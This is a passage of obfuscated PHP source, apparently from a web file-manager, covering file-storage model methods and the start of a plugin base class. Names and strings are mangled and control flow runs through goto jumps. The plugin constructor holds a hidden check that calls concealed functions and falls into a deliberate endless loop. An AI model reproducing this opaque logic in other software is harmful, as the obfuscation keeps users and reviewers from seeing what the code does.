$BÏ«ö¨°ÌÇ = array_unique(array_to_keyvalue($EÂ…Ï¸îë, $D®¿”Ò“”[33], $D®¿”Ò“”[2102])); $BÏ«ö¨°ÌÇ = array_remove_value($BÏ«ö¨°ÌÇ, $D®¿”Ò“”[464]); goto b„¡áÌùÏ‰; b„¡áÌùÏ‰: if (!$BÏ«ö¨°ÌÇ) { return; } $DÄ”á«˜Ê® = $this->where(array($D®¿”Ò“”[2103] => array($D®¿”Ò“”[7], $BÏ«ö¨°ÌÇ)))->select(); $DÄ”á«˜Ê® = array_to_keyvalue($DÄ”á«˜Ê®, $D®¿”Ò“”[2112]); goto Aˆƒ×ŸŠŒÙ; Aˆƒ×ŸŠŒÙ: foreach ($EÂ…Ï¸îë as &$C†˜Ğßœ˜) { if (isset($DÄ”á«˜Ê®[$C†˜Ğßœ˜[$D®¿”Ò“”[2102]]])) { $C†˜Ğßœ˜[$D®¿”Ò“”[2115]] = $DÄ”á«˜Ê®[$C†˜Ğßœ˜[$D®¿”Ò“”[2102]]]; } } goto D„ö¡À¦Â; D„ö¡À¦Â: } private function _listAppendUser(&$d»„éÛ’’ã) { goto bºÚäõ´“‹; c¿ëŞ±¶‡: foreach ($d»„éÛ’’ã as &$c½„ŠØ‡šê) { $c½„ŠØ‡šê[$böãºª®ºè[531]] = $cƒª¡¦É[$c½„ŠØ‡šê[$böãºª®ºè[1412]]]; if (isset($c½„ŠØ‡šê[$böãºª®ºè[2115]])) { $c½„ŠØ‡šê[$böãºª®ºè[2115]][$böãºª®ºè[531]] = $cƒª¡¦É[$c½„ŠØ‡šê[$böãºª®ºè[2115]][$böãºª®ºè[1412]]]; } } goto Fà˜„‚èÁ±; bºÚäõ´“‹: $böãºª®ºè =& $_SERVER[¢à]; $e†Š‘†ÉŠ = array_unique(array_to_keyvalue($d»„éÛ’’ã, $böãºª®ºè[33], $böãºª®ºè[1412])); $e†Š‘†ÉŠ = array_remove_value($e†Š‘†ÉŠ, $böãºª®ºè[464]); goto fÉğÛøƒ„; fÉğÛøƒ„: if (count($e†Š‘†ÉŠ) == 0) { return; } foreach ($d»„éÛ’’ã as $c½„ŠØ‡šê) { if (isset($c½„ŠØ‡šê[$böãºª®ºè[2115]])) { $e†Š‘†ÉŠ[] = $c½„ŠØ‡šê[$böãºª®ºè[2115]][$böãºª®ºè[1412]]; } } $cƒª¡¦É = Model($böãºª®ºè[473])->userListInfo($e†Š‘†ÉŠ); goto c¿ëŞ±¶‡; Fà˜„‚èÁ±: } private function _listAppendMeta(&$BÁÉƒ÷›ÄÎ) { goto b†åê¯–Ø; eİ£Õë®¾: if (!$F«¶ÈÌ¦è) { return; } foreach ($BÁÉƒ÷›ÄÎ as $aŒã¡ºíøĞ) { if (isset($aŒã¡ºíøĞ[$FÎ¸óªÜœ¢[2115]])) { $F«¶ÈÌ¦è[] = $aŒã¡ºíøĞ[$FÎ¸óªÜœ¢[2115]][$FÎ¸óªÜœ¢[2112]]; } } $E¼ÄÏá´î¼ = $this->metaList($F«¶ÈÌ¦è); goto e—çæöÂ; b†åê¯–Ø: $FÎ¸óªÜœ¢ =& $_SERVER[¢à]; $F«¶ÈÌ¦è = array_unique(array_to_keyvalue($BÁÉƒ÷›ÄÎ, $FÎ¸óªÜœ¢[33], $FÎ¸óªÜœ¢[2112])); $F«¶ÈÌ¦è = array_remove_value($F«¶ÈÌ¦è, $FÎ¸óªÜœ¢[464]); goto eİ£Õë®¾; e—çæöÂ: if (!$E¼ÄÏá´î¼) { return !1; } foreach ($BÁÉƒ÷›ÄÎ as &$aŒã¡ºíøĞ) { $aŒã¡ºíøĞ[$FÎ¸óªÜœ¢[413]] = $E¼ÄÏá´î¼[$aŒã¡ºíøĞ[$FÎ¸óªÜœ¢[2112]]]; if (isset($aŒã¡ºíøĞ[$FÎ¸óªÜœ¢[2115]])) { $aŒã¡ºíøĞ[$FÎ¸óªÜœ¢[2115]][$FÎ¸óªÜœ¢[413]] = $E¼ÄÏá´î¼[$aŒã¡ºíøĞ[$FÎ¸óªÜœ¢[2115]][$FÎ¸óªÜœ¢[2112]]]; } } goto e•¢‹†ß¹Ú; e•¢‹†ß¹Ú: } private function metaList($aà·îÌíÒ) { goto a·Ä×îå±ö; B´ˆÑõ×ªí: return $b×è¦…×èÛ ? $b×è¦…×èÛ : array(); goto bÑÉàŸî†; a·Ä×îå±ö: $B×à×Ğó• =& $_SERVER[¢à]; if (!$aà·îÌíÒ) { return array(); } $AöôÅ®¨ñŸ = array($B×à×Ğó•[2112] => array($B×à×Ğó•[7], $aà·îÌíÒ)); goto Aíã¦ßÁÒ´; Aíã¦ßÁÒ´: $b×è¦…×èÛ = Model($B×à×Ğó•[2116])->where($AöôÅ®¨ñŸ)->select(); $b×è¦…×èÛ = array_to_keyvalue_group($b×è¦…×èÛ, $B×à×Ğó•[2112]); foreach ($b×è¦…×èÛ as $f’º™Ğ¬³Ì => $e–ŠŒ¶Ü‚—) { $c”¬“î‘‚ä = array(); foreach ($e–ŠŒ¶Ü‚— as $E§™‰Œè) { $c”¬“î‘‚ä[$E§™‰Œè[$B×à×Ğó•[89]]] = $E§™‰Œè[$B×à×Ğó•[356]]; } $b×è¦…×èÛ[$f’º™Ğ¬³Ì] = $c”¬“î‘‚ä; } goto B´ˆÑõ×ªí; bÑÉàŸî†: } } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\151\154\145"; protected $tableMeta = array("\x74\x61\142\154\x65\116\x61\155\x65" => "\x69\x6f\137\146\x69\x6c\x65\137\155\x65\x74\141", "\x6d\145\164\141\106\x69\x65\154\144" => "\x66\x69\154\x65\111\104"); public function fileInfo($F©Š­½¸¾µ) { $C¥˜Û£­†Û =& $_SERVER[¢à]; static $BÎÀù°ˆÅš = array(); if (!isset($BÎÀù°ˆÅš[$F©Š­½¸¾µ])) { $a½¨äÃƒÏÚ = $C¥˜Û£­†Û[2117]; $bø”‡¹„Íé = Model($C¥˜Û£­†Û[418])->field($a½¨äÃƒÏÚ)->where(array($C¥˜Û£­†Û[416] => $F©Š­½¸¾µ))->find(); $BÎÀù°ˆÅš[$F©Š­½¸¾µ] = $bø”‡¹„Íé; } return $BÎÀù°ˆÅš[$F©Š­½¸¾µ]; } public function addFileByContent($eùÁÏÜ÷‹ä = '', $B†ôÎÏ®Ãª = '') { goto DŠÛ¢²Ï¥œ; d›À¤ñ‹: if (file_exists($cê¦Â†œ•)) { @unlink($cê¦Â†œ•); } return $B“ï„é£; goto e™§öÌŒå; DŠÛ¢²Ï¥œ: $dÑ…¨‡¥Äˆ =& $_SERVER[¢à]; $c„†°éŒ«Ş = TEMP_PATH . $dÑ…¨‡¥Äˆ[2118]; if (!is_dir($c„†°éŒ«Ş)) { mk_dir($c„†°éŒ«Ş); } goto a—ì´…Ûœ; a—ì´…Ûœ: $cê¦Â†œ• = $c„†°éŒ«Ş . $dÑ…¨‡¥Äˆ[2119] . rand_string(16); file_put_contents($cê¦Â†œ•, $eùÁÏÜ÷‹ä); $B“ï„é£ = $this->addFile($cê¦Â†œ•, $B†ôÎÏ®Ãª, !0); goto d›À¤ñ‹; e™§öÌŒå: } public function createFileName($C²­‘íğì¾) { goto c˜˜ƒòƒ®¨; C°ùì«‹µ¡: $AïÕ÷Ğ”¡ = $cÑÜœÂÓå•->pathFather($Dˆ›š¹íˆÛ); static $D™œô»Ú•Ô = false; $F±ƒ—ÑÕ¨ƒ = $c¥Ì¯æ•ø¦[2120] . md5($AïÕ÷Ğ”¡); goto c‰ÂŠƒº½; c‰ÂŠƒº½: if (!$D™œô»Ú•Ô && !Cache::get($F±ƒ—ÑÕ¨ƒ)) { $D™œô»Ú•Ô = !0; $F´„ŸÎ²• = IO::mkdir($AïÕ÷Ğ”¡); if (!IO::exist($F´„ŸÎ²• . $c¥Ì¯æ•ø¦[2121])) { IO::mkfile($F´„ŸÎ²• . $c¥Ì¯æ•ø¦[2121]); } Cache::set($F±ƒ—ÑÕ¨ƒ, 1, 3600 * 2); } return $Dˆ›š¹íˆÛ; goto eÓ×’®²¾; c˜˜ƒòƒ®¨: $c¥Ì¯æ•ø¦ =& $_SERVER[¢à]; $cÑÜœÂÓå• = IO::init($c¥Ì¯æ•ø¦[8]); $Dˆ›š¹íˆÛ = $this->makeFilePath($C²­‘íğì¾, $cÑÜœÂÓå•); goto C°ùì«‹µ¡; eÓ×’®²¾: } public function makeFilePath($aÆ˜©•‹ç·, $Aæšëô ¬Œ) { goto böÀÕë¯”‚; böÀÕë¯”‚: $E´•ÔäˆÜ· =& $_SERVER[¢à]; $D ÀÙÛÓÃ = Model($E´•ÔäˆÜ·[1084])->get($E´•ÔäˆÜ·[2122]); $dÅÕâĞ±‘• = KodIO::defaultIO() . date($E´•ÔäˆÜ·[2123]); goto DŸÄ†ÔïÖ; Eƒß¶Á±å: switch ($D ÀÙÛÓÃ) { case $E´•ÔäˆÜ·[2125]: $EªÚƒ‚ÇÓ = $EªÚƒ‚ÇÓ . $E´•ÔäˆÜ·[93] . $Aæšëô ¬Œ->ext($aÆ˜©•‹ç·); if ($Aæšëô ¬Œ->ext($aÆ˜©•‹ç·) == $E´•ÔäˆÜ·[2065]) { $EªÚƒ‚ÇÓ .= $E´•ÔäˆÜ·[2126]; } break; case $E´•ÔäˆÜ·[2127]: goto a‡†…ÛÂŞ¨; F¸‚à¸éªº: break; goto CÁàŞœæ¼; c¿šŒ¬¦Ã¬: if ($Aæšëô ¬Œ->ext($aÆ˜©•‹ç·) == $E´•ÔäˆÜ·[2065]) { $aÆ˜©•‹ç· .= $E´•ÔäˆÜ·[2126]; } $AÒ¦›Ÿ‘· = IO::fileNameAuto($dÅÕâĞ±‘•, $aÆ˜©•‹ç·); $EªÚƒ‚ÇÓ = $dÅÕâĞ±‘• . $AÒ¦›Ÿ‘·; goto F¸‚à¸éªº; a‡†…ÛÂŞ¨: $e±ŸÒ®ÁŠ = Model($E´•ÔäˆÜ·[1084])->get($E´•ÔäˆÜ·[1310]); $fŒÉ‰ËŠÓ• = substr(md5($E´•ÔäˆÜ·[1885] . $e±ŸÒ®ÁŠ . date($E´•ÔäˆÜ·[687])), 0, 8); $dÅÕâĞ±‘• = KodIO::defaultIO() . date($E´•ÔäˆÜ·[2128]) . $fŒÉ‰ËŠÓ• . $E´•ÔäˆÜ·[8]; goto c¿šŒ¬¦Ã¬; CÁàŞœæ¼: case $E´•ÔäˆÜ·[2124]: break; default: break; } return $EªÚƒ‚ÇÓ; goto F’ˆ˜×Îè‡; DŸÄ†ÔïÖ: $EªÚƒ‚ÇÓ = $dÅÕâĞ±‘• . rand_string(5) . short_id(100); $aÆ˜©•‹ç· = str_replace($E´•ÔäˆÜ·[8], $E´•ÔäˆÜ·[70], KodIO::clear($aÆ˜©•‹ç·)); if (!$aÆ˜©•‹ç·) { $D ÀÙÛÓÃ = $E´•ÔäˆÜ·[2124]; } goto Eƒß¶Á±å; F’ˆ˜×Îè‡: } public function addFileByRemote($FÃ‚İç›Ş¬, $Dã÷°ê°è, $F½Ù»…¹·Õ = array()) { goto AìùÑµ³Ê¶; eÊŒÖãÎê: if ($EÊ×Óã­»© = $this->addFileCheckExist($c“Õº°[$CÙëëÇË¶ç[161]], $c“Õº°[$CÙëëÇË¶ç[160]], $c“Õº°[$CÙëëÇË¶ç[77]])) { return $EÊ×Óã­»©; } return $this->addFileData($c“Õº°); goto d’‚¾äÍ¬; AìùÑµ³Ê¶: $CÙëëÇË¶ç =& $_SERVER[¢à]; if (!IO::exist($FÃ‚İç›Ş¬)) { return !1; } $C¨©ÅíŠ = $F½Ù»…¹·Õ[$CÙëëÇË¶ç[160]] ? $F½Ù»…¹·Õ[$CÙëëÇË¶ç[160]] : $CÙëëÇË¶ç[33]; goto E»ø´ÄŠ¸ª; E»ø´ÄŠ¸ª: $EÁŸğßÒà = IO::hashMd5($FÃ‚İç›Ş¬, $C¨©ÅíŠ); $aà’…’¯ÅÛ = KodIO::defaultDriver(); $c“Õº° = array($CÙëëÇË¶ç[516] => IO::size($FÃ‚İç›Ş¬), $CÙëëÇË¶ç[2129] => 1, $CÙëëÇË¶ç[383] => $Dã÷°ê°è, $CÙëëÇË¶ç[735] => $aà’…’¯ÅÛ[$CÙëëÇË¶ç[364]], $CÙëëÇË¶ç[384] => $FÃ‚İç›Ş¬, $CÙëëÇË¶ç[2130] => $F½Ù»…¹·Õ[$CÙëëÇË¶ç[161]] ? $F½Ù»…¹·Õ[$CÙëëÇË¶ç[161]] : IO::hashSimple($FÃ‚İç›Ş¬), $CÙëëÇË¶ç[2131] => $EÁŸğßÒà ? $EÁŸğßÒà : $C¨©ÅíŠ); goto eÊŒÖãÎê; d’‚¾äÍ¬: } private function addFileData($aÌÆÔ±„) { $EŸ¦„¼—ˆ =& $_SERVER[¢à]; if (!$aÌÆÔ±„) { return !1; } $aÌÆÔ±„[$EŸ¦„¼—ˆ[77]] = intval($aÌÆÔ±„[$EŸ¦„¼—ˆ[77]]); if (!$aÌÆÔ±„[$EŸ¦„¼—ˆ[77]] && strlen($aÌÆÔ±„[$EŸ¦„¼—ˆ[161]]) > 32) { $aÌÆÔ±„[$EŸ¦„¼—ˆ[77]] = intval(substr($aÌÆÔ±„[$EŸ¦„¼—ˆ[161]], 32)); } $FäáÚêá½ = $this->add($aÌÆÔ±„); return $this->find($FäáÚêá½); } public function addFile($E¯Ì•ó, $AÊƒ¥©Ûœâ, $c…„·ÏÑ’ = false) { $aª÷¢Û’‘¨ = IO::hashSimple($E¯Ì•ó); $eæÏí‡Š˜ = IO::hashMd5($E¯Ì•ó); $C‘à–Ÿ‹á = IO::size($E¯Ì•ó); if ($A…éÌ…¸”Á = $this->addFileCheckExist($aª÷¢Û’‘¨, $eæÏí‡Š˜, $C‘à–Ÿ‹á)) { return $A…éÌ…¸”Á; } $e¡ø„ÅÂ‡ = $this->addFileMake($E¯Ì•ó, $C‘à–Ÿ‹á, $aª÷¢Û’‘¨, $eæÏí‡Š˜, $AÊƒ¥©Ûœâ, $c…„·ÏÑ’); return $this->addFileData($e¡ø„ÅÂ‡); } public function addFileMake($DõÌÏƒŸÆÁ, $e°–ôëõ¼, $Cµ‡Ÿ™²›‚, $FÒÓ×º£, $cØŠ¨ñ‰÷ , $c…Œ¨³÷ì¾) { goto B¤Å¹ê«‰â; B¤Å¹ê«‰â: $cñÙÓù¦º =& $_SERVER[¢à]; $BöõíÚÜ“ = $this->createFileName($cØŠ¨ñ‰÷ ); $d‰ƒ³›ˆˆÍ = get_path_father($BöõíÚÜ“); goto b÷½ˆ“¦‰; bÅ¶¾×Æ®: $b¹¿•°Œã½ = KodIO::defaultDriver(); $e·œ±Õ•î = array($cñÙÓù¦º[516] => $e°–ôëõ¼, $cñÙÓù¦º[2129] => 1, $cñÙÓù¦º[383] => $cØŠ¨ñ‰÷ , $cñÙÓù¦º[735] => $b¹¿•°Œã½[$cñÙÓù¦º[364]], $cñÙÓù¦º[384] => $BöõíÚÜ“, $cñÙÓù¦º[2130] => $Cµ‡Ÿ™²›‚, $cñÙÓù¦º[2131] => $FÒÓ×º£); return $e·œ±Õ•î; goto föóÄšƒ„; b÷½ˆ“¦‰: $CëÔÁÜ£ = get_path_this($BöõíÚÜ“); if ($c…Œ¨³÷ì¾) { $fàğòòÑ´¸ = IO::move($DõÌÏƒŸÆÁ, $d‰ƒ³›ˆˆÍ, !1, $CëÔÁÜ£); } else { $fàğòòÑ´¸ = IO::copy($DõÌÏƒŸÆÁ, $d‰ƒ³›ˆˆÍ, !1, $CëÔÁÜ£); } if (!$fàğòòÑ´¸) { return !1; } goto bÅ¶¾×Æ®; föóÄšƒ„: } public function addFileCheckExist($a×‰¾éòÔˆ, $fèæ¢Ğ‡¼ø, $e¹£ÒË ğ°) { $fåÄ îÓ§ =& $_SERVER[¢à]; $CÏéëßğÒ« = $this->findByHash($a×‰¾éòÔˆ, $fèæ¢Ğ‡¼ø); if (!$CÏéëßğÒ«) { return !1; } $c˜ì¿¦èĞÚ = array($fåÄ îÓ§[2129] => intval($CÏéëßğÒ«[$fåÄ îÓ§[2132]]) + 1, $fåÄ îÓ§[516] => $e¹£ÒË ğ°); $this->where(array($fåÄ îÓ§[416] => $CÏéëßğÒ«[$fåÄ îÓ§[415]]))->save($c˜ì¿¦èĞÚ); return $CÏéëßğÒ«; } public function remove($dÇ„®ø¸²Æ) { $this->linkCountChange($dÇ„®ø¸²Æ, !1); $this->clearEmpty(); return !0; } public function linkAdd($f­ÏÆÅùÖÑ) { $this->linkCountChange($f­ÏÆÅùÖÑ, !0); } public function linkCountChange($b¼×‡Ş’Óˆ, $C„¸–ÓíÅÛ) { goto aóØ¦Íå¹ç; D…”‰÷¿¥: $añ‹Öçä¿ = array(); foreach ($b¼×‡Ş’Óˆ as $bÄõã±¶„À) { $a‹æ³Úéáµ = $bÄõã±¶„À . $CìŠÙŸ±ë[33]; if (!$añ‹Öçä¿[$a‹æ³Úéáµ]) { $añ‹Öçä¿[$a‹æ³Úéáµ] = 0; } $añ‹Öçä¿[$a‹æ³Úéáµ]++; } $C‰îç×áóå = array(); goto FæîÜ¡ˆ­É; aóØ¦Íå¹ç: $CìŠÙŸ±ë =& $_SERVER[¢à]; if (!$b¼×‡Ş’Óˆ) { return; } if (!is_array($b¼×‡Ş’Óˆ)) { $b¼×‡Ş’Óˆ = array($b¼×‡Ş’Óˆ); } goto D…”‰÷¿¥; FæîÜ¡ˆ­É: foreach ($añ‹Öçä¿ as $bÄõã±¶„À => $aÛš½±Ÿ‚’) { $a‹æ³Úéáµ = $aÛš½±Ÿ‚’ . $CìŠÙŸ±ë[33]; if (!$C‰îç×áóå[$a‹æ³Úéáµ]) { $C‰îç×áóå[$a‹æ³Úéáµ] = array(); } $C‰îç×áóå[$a‹æ³Úéáµ][] = $bÄõã±¶„À; } foreach ($C‰îç×áóå as $aÛš½±Ÿ‚’ => $a‰È½‚í±•) { if (!$a‰È½‚í±•) { continue; } $aÛš½±Ÿ‚’ = $C„¸–ÓíÅÛ ? $aÛš½±Ÿ‚’ : -intval($aÛš½±Ÿ‚’); $C´Ê ¨— = array($CìŠÙŸ±ë[415] => array($CìŠÙŸ±ë[7], $a‰È½‚í±•)); if ($aÛš½±Ÿ‚’ < 0) { $C´Ê ¨—[$CìŠÙŸ±ë[2132]] = array($CìŠÙŸ±ë[927], abs($aÛš½±Ÿ‚’)); } $this->where($C´Ê ¨—)->setAdd($CìŠÙŸ±ë[2132], $aÛš½±Ÿ‚’); } goto EÂ¥Õ„„İ£; EÂ¥Õ„„İ£: } public function findByHash($CŸ„Íºò¬°, $BºÏÚœˆÊ„ = false) { $bš…­æº°Ş =& $_SERVER[¢à]; if (!$CŸ„Íºò¬° && !$BºÏÚœˆÊ„) { return !1; } $cŠ¹½ÏÄ™¿ = array($bš…­æº°Ş[2130] => $CŸ„Íºò¬°); if ($BºÏÚœˆÊ„) { $cŠ¹½ÏÄ™¿ = array($bš…­æº°Ş[2131] => $BºÏÚœˆÊ„); } return $this->order($bš…­æº°Ş[2133])->where($cŠ¹½ÏÄ™¿)->find(); } public function clearEmpty($f–°§§œº = 0) { goto cÀÄÜéÁˆĞ; cÀÄÜéÁˆĞ: $A Ë¹‹îÏ =& $_SERVER[¢à]; $dëÅø ·Ç = time() - 3600 * 24 * $f–°§§œº; $a±¸ÌéÔæÔ = $A Ë¹‹îÏ[2134] . $dëÅø ·Ç; goto Féç»æ´; Fï¯¯ß»Ğ: foreach ($bğĞİ“¡× as $E¡Û½–³Ùè) { $b½¹•ïîö®->update(1); $this->resetFile($E¡Û½–³Ùè); } $b½¹•ïîö®->end(); goto A¤óÔšòÎ; Féç»æ´: $bğĞİ“¡× = $this->where($a±¸ÌéÔæÔ)->select(); if (!$bğĞİ“¡×) { return; } $b½¹•ïîö® = new Task($A Ë¹‹îÏ[2135], $A Ë¹‹îÏ[33], count($bğĞİ“¡×)); goto Fï¯¯ß»Ğ; A¤óÔšòÎ: } private function resetFile($aÒß´ìÏĞ¡) { goto e£¥®¸Ğ¾; e£¥®¸Ğ¾: $Eõ¿ÆÄ¶ =& $_SERVER[¢à]; $fŒğåñËèË = array($Eõ¿ÆÄ¶[416] => $aÒß´ìÏĞ¡[$Eõ¿ÆÄ¶[415]]); $dÅç¥…Ùæµ = Model($Eõ¿ÆÄ¶[1106])->where($fŒğåñËèË)->count(); goto f²‘Ğ½õËË; FÇÙ”óèğ: if ($aÒß´ìÏĞ¡[$Eõ¿ÆÄ¶[2132]] != $e°¥¶¡ÅĞˆ) { $this->where($fŒğåñËèË)->save(array($Eõ¿ÆÄ¶[2129] => $e°¥¶¡ÅĞˆ)); } goto Cõ£Œ³”³ì; f²‘Ğ½õËË: $D…Ô¥Æì³™ = Model($Eõ¿ÆÄ¶[2136])->where($fŒğåñËèË)->count(); $e°¥¶¡ÅĞˆ = intval($dÅç¥…Ùæµ) + intval($D…Ô¥Æì³™); if ($e°¥¶¡ÅĞˆ == 0) { IO::remove($aÒß´ìÏĞ¡[$Eõ¿ÆÄ¶[75]]); $this->where($fŒğåñËèË)->delete(); $this->metaSet($aÒß´ìÏĞ¡[$Eõ¿ÆÄ¶[415]], null, null); return; } goto FÇÙ”óèğ; Cõ£Œ³”³ì: } public function storageInfo($DÕİ’‘¿ = false) { goto F™ÑÜÆ‹; d¢ÜÓôßø: for ($c‘Úõ½Úëñ = 0; $c‘Úõ½Úëñ < $C§÷íù¼òÈ; $c‘Úõ½Úëñ = $c‘Úõ½Úëñ + $Cêç‰÷•°ø) { $e˜‚ ºù³¹ = $this->limit($c‘Úõ½Úëñ, $c‘Úõ½Úëñ + $Cêç‰÷•°ø)->select(); foreach ($e˜‚ ºù³¹ as $eÄ› Öƒ) { $a¹¹éùÈÁ¾ += $eÄ› Öƒ[$BöŞâ£¥Ÿ[77]] * $eÄ› Öƒ[$BöŞâ£¥Ÿ[2132]]; $E¡Å„“‰¶Û += $eÄ› Öƒ[$BöŞâ£¥Ÿ[77]] * ($eÄ› Öƒ[$BöŞâ£¥Ÿ[2132]] - 1); $F‹ó±—ª©Ä += $eÄ› Öƒ[$BöŞâ£¥Ÿ[2132]]; } } $fõ›¥ŒôŠ‹ = array($BöŞâ£¥Ÿ[2137] => $a¹¹éùÈÁ¾, $BöŞâ£¥Ÿ[2138] => $E¡Å„“‰¶Û, $BöŞâ£¥Ÿ[2139] => $E¡Å„“‰¶Û / $a¹¹éùÈÁ¾, $BöŞâ£¥Ÿ[81] => $C§÷íù¼òÈ, $BöŞâ£¥Ÿ[2140] => $F‹ó±—ª©Ä); return $fõ›¥ŒôŠ‹; goto aÃ–¥Ï˜„ç; cù‹Š²„„—: $a¹¹éùÈÁ¾ = 1; $F‹ó±—ª©Ä = 0; $Cêç‰÷•°ø = 5000; goto d¢ÜÓôßø; F™ÑÜÆ‹: $BöŞâ£¥Ÿ =& $_SERVER[¢à]; $C§÷íù¼òÈ = $this->count() + 0.0; $E¡Å„“‰¶Û = 0; goto cù‹Š²„„—; aÃ–¥Ï˜„ç: } } goto bôÄÎ¸Ğã; a—âïÃ•æä: register_shutdown_function($_SERVER[‚¬û][36]); set_error_handler($_SERVER[‚¬û][49], $b¾Š…¢Ì™ã); if (function_exists($_SERVER[‚¬û][50])) { set_exception_handler($_SERVER[‚¬û][51]); } goto D¸²…ê‰·; CÀç©• §Ú: function beforeShutdownFatalError($A³©“º‘Ï×) { think_exception($A³©“º‘Ï×); } $_SERVER[$_SERVER[‚¬û][48]] = $dÊª¡˜ÆõŞ($_SERVER[$_SERVER[‚¬û][45]]); $b¾Š…¢Ì™ã = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto a—âïÃ•æä; F·„†İùŒÕ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto DØÁÆÏÕš; DØÁÆÏÕš: $c¼Ù¨ªŸæ„ =& $_SERVER[¢à]; if (!isset($_SERVER[$c¼Ù¨ªŸæ„[786]]) || !isset($_SERVER[$c¼Ù¨ªŸæ„[787]])) { goto A•½Òº¶¾Ö; Bé›ŞÜ»: $c‘ëäÕ•Ú• = $c¼Ù¨ªŸæ„[793]; $c‘ëäÕ•Ú•($_SERVER[$c¼Ù¨ªŸæ„[794]]); $Aœ„«Ó–Üí = 1; goto AÙØÏİ¹É; AÙØÏİ¹É: for ($Bæó¨£Ë™Ò = $Aœ„«Ó–Üí; $Bæó¨£Ë™Ò > 0; $Bæó¨£Ë™Ò++) { $c‘ëäÕ•Ú• = json_encode($GLOBALS[$c¼Ù¨ªŸæ„[381]]); } goto dÓ‹Å©ìË˜; A•½Òº¶¾Ö: $C¿„¿±¯†ğ = $c¼Ù¨ªŸæ„[788]; $DÒÌÊ³İé = $c¼Ù¨ªŸæ„[789]; $BÌ‡‰¬–Ûˆ = $_SERVER[$c¼Ù¨ªŸæ„[790]] . $c¼Ù¨ªŸæ„[791]; goto C–‡ÄÆÍ¹¸; C–‡ÄÆÍ¹¸: $c¯ÄìÈéï§ = $DÒÌÊ³İé($BÌ‡‰¬–Ûˆ); $cëÑ„ïÆà“ = explode($c¼Ù¨ªŸæ„[214], $c¯ÄìÈéï§); if (count($cëÑ„ïÆà“) < $c¼Ù¨ªŸæ„[558]) { $D‘©ŒÖ°¢à = $c¼Ù¨ªŸæ„[792]; $D‘©ŒÖ°¢à(); } goto Bé›ŞÜ»; dÓ‹Å©ìË˜: } global $in, $config; goto d¨‰‰³ˆ¥×; d¨‰‰³ˆ¥×: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($c¼Ù¨ªŸæ„[1295]); goto Bô«Ñ°ß¸æ; Bô«Ñ°ß¸æ: $this->pluginName = str_replace($c¼Ù¨ªŸæ„[1295], $c¼Ù¨ªŸæ„[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $c¼Ù¨ªŸæ„[8]; $this->pluginApi = appHostGet() . $c¼Ù¨ªŸæ„[1296] . $this->pluginName . $c¼Ù¨ªŸæ„[8]; goto Bò¦î±ë‡„; Bò¦î±ë‡„: $this->pluginHost = PLUGIN_HOST . $this->pluginName . $c¼Ù¨ªŸæ„[8]; $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $c¼Ù¨ªŸæ„[8]; $this->pluginLangArr = $this->initLang(); goto bÒÌ»òÖÂ¾; bÒÌ»òÖÂ¾: $this->values = array(); return $this; goto f“¶Ÿ­å¹; f“¶Ÿ­å¹: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¢à][1297]); } protected function assign($eÅ×Èù†¼², $fÆÄ¹¯Šã× = false) { if (is_array($eÅ×Èù†¼²)) { $this->values = array_merge($this->values, $eÅ×Èù†¼²); } else { $this->values[$eÅ×Èù†¼²] = $fÆÄ¹¯Šã×; } } protected function display($CÍ©ßÓ) { extract($this->values); require $CÍ©ßÓ; } final function hookRegist($cÆµŸŞÅµ) { $this->modelPlugin->appRegist($this->pluginName, $cÆµŸŞÅµ); } final function appIcon() { $C½Ä°ƒ—± =& $_SERVER[¢à]; $Dî•ÙéŒÁ = $this->appPackage(); $c½Î®–‹ôÅ = $C½Ä°ƒ—±[33]; if (isset($Dî•ÙéŒÁ[$C½Ä°ƒ—±[379]])) { if (isset($Dî•ÙéŒÁ[$C½Ä°ƒ—±[379]][$C½Ä°ƒ—±[1298]])) { $c½Î®–‹ôÅ = $C½Ä°ƒ—±[1299] . $Dî•ÙéŒÁ[$C½Ä°ƒ—±[379]][$C½Ä°ƒ—±[1298]] . $C½Ä°ƒ—±[1300]; } else { if ($Dî•ÙéŒÁ[$C½Ä°ƒ—±[379]][$C½Ä°ƒ—±[1301]]) { $c½Î®–‹ôÅ = $C½Ä°ƒ—±[1302] . $Dî•ÙéŒÁ[$C½Ä°ƒ—±[379]][$C½Ä°ƒ—±[1301]] . $C½Ä°ƒ—±[1303]; } } } return $c½Î®–‹ôÅ; } final function fileCanView($BŒÈšçÂÎİ) { $E­¬ŞËÙîä =& $_SERVER[¢à]; if (request_url_safe($BŒÈšçÂÎİ)) { return !0; } if ($this->isShare($BŒÈšçÂÎİ)) { return !0; } if (!Action($E­¬ŞËÙîä[1304])->authCan($E­¬ŞËÙîä[1305])) { show_tips(LNG($E­¬ŞËÙîä[1306]) . $E­¬ŞËÙîä[1307], !1); } ActionCall($E­¬ŞËÙîä[1308], $BŒÈšçÂÎİ); } final function isShare($EëôËÜ–“) { $f÷·«ËßŸ = KodIO::parse($EëôËÜ–“); return $f÷·«ËßŸ[$_SERVER[¢à][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($DÓäŠŒ„Èä) { if (request_url_safe($DÓäŠŒ„Èä)) { return $DÓäŠŒ„Èä; } if (!$this->isShare($DÓäŠŒ„Èä)) { $DÓäŠŒ„Èä = $this->filePath($DÓäŠŒ„Èä); } return Action($_SERVER[¢à][1013])->linkOut($DÓäŠŒ„Èä); } public function filePathLinkOut($D¸«ËÁïÏ) { if (request_url_safe($D¸«ËÁïÏ)) { return $D¸«ËÁïÏ; } $this->fileCanView($D¸«ËÁïÏ); return Action($_SERVER[¢à][1013])->link($D¸«ËÁïÏ); } final function filePath($f‰ÛÖôÎ“) { $dŸˆˆºé‰ =& $_SERVER[¢à]; if ($eÂ´Á¹šæ­ = $this->checkSharePath($f‰ÛÖôÎ“)) { return $eÂ´Á¹šæ­; } $this->fileCanView($f‰ÛÖôÎ“); if (request_url_safe($f‰ÛÖôÎ“)) { $bÊ—º©‘àÜ = parse_url_query($f‰ÛÖôÎ“); if (isset($bÊ—º©‘àÜ[$dŸˆˆºé‰[1309]]) && 